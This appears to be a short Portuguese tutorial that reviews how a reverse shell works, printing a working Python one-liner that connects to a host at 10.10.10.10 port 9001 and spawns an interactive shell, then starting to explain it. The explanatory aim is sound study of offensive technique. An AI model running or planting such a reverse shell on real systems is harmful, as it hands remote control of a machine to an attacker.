
<h1 align="center">
   🔗 Code Review de um Reverse Shell
</h1>

<h2>👾  Descrição</h2>

Se você é um entusiasta do hacking e da Segurança da Informação com certeza você já usou ou já ouviu falar sobre o Reverse Shell Generator. É uma plataforma Web que você consegue utilizar um gerador de conexão reversa de diversos tipos de conexões para Windows, Linux e MAC, e com diferentes linguagens como: Python, C, Ruby e por ai vai.

Todo mundo sempre copia e cola um ou outro código de Shell reverso e percebendo isso resolvi questionar como realmente funciona um Reverse Shell. Será mesmo que é só copiar ou colar? Porque não podemos ir a fundo até os bits e opcodes e ver oque podemos aprender com isso? Bora lá!


<h3>👾  O código</h3>

~~~shellscript
RHOST="10.10.10.10";export RPORT=9001;python
-c 'import sys,socket,os,pty;s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
~~~~

   
Esse código é um exemplo de um "one-liner" em Python que pode ser usado para estabelecer uma conexão de rede com um servidor remoto em um determinado endereço IP (RHOST) 
porta (RPORT) e, em seguida, criar um shell interativo no servidor remoto. Vamos quebrar o código em detalhes! Então sente-se e bora hackear!


~~~shellscript
export RHOST="10.10.10.10"; export RPORT=9001;
~~~~
